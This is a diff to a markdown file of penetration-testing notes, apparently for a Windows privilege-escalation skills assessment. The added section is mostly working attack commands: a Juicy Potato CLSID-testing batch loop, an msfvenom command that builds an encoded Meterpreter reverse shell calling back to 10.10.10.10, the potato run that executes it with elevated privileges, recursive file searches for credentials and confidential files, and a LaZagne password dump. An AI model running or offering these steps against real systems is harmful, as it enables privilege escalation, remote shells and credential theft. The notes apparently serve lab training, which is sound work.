@@ -241,26 +241,9 @@ Connection: close
 ---
 ### Windows Priv Esc:
 ---
-#### Skills Assessment :
+#### Skills Assessment I:
 
-https://github.com/k4sth4/Juicy-Potato
-
-```
-@echo off
-:: Starting port, you can change it
-set /a port=10000
-SETLOCAL ENABLEDELAYEDEXPANSION
-
-FOR /F %%i IN (CLSID.list) DO (
-   echo %%i !port!
-   juicypotato.exe -z -l !port! -c %%i >> result.log
-   set RET=!ERRORLEVEL!
-   :: echo !RET!
-   if "!RET!" == "1"  set /a port=port+1
-)
-```
-
-
+##### Get the CLIDs:
 ```
 <#
 This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
@@ -321,3 +304,33 @@ $RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath ".\$TARGET\CLS
 # Visual Table
 $RESULT | ogv
 ```
+
+##### Get the valid CLIDs:
+
+```
+@echo off
+:: Starting port, you can change it
+set /a port=10000
+SETLOCAL ENABLEDELAYEDEXPANSION
+
+FOR /F %%i IN (CLSID.list) DO (
+   echo %%i !port!
+   juicypotato.exe -z -l !port! -c %%i >> result.log
+   set RET=!ERRORLEVEL!
+   :: echo !RET!
+   if "!RET!" == "1"  set /a port=port+1
+)
+```
+
+##### Get the Potato and execute it:
+* https://github.com/k4sth4/Juicy-Potato
+  
+```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe```
+```PS C:\users\public> .\jp.exe -t * -p .\m.exe -l 4444 -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"```
+
+##### Search for contents and files:
+```for /R %i in (*) do findstr /I /C:"ldapadmin" "%i" && echo %i```
+```Get-ChildItem -Recurse -Filter * | Select-String -Pattern "ldapadmin" -CaseSensitive:$false | Select-Object -Property Path```
+```Get-ChildItem -Path C:\ -Recurse -Filter "confidential.txt" -ErrorAction SilentlyContinue | Select-Object FullName```
+OR
+```LaZagne.exe all```
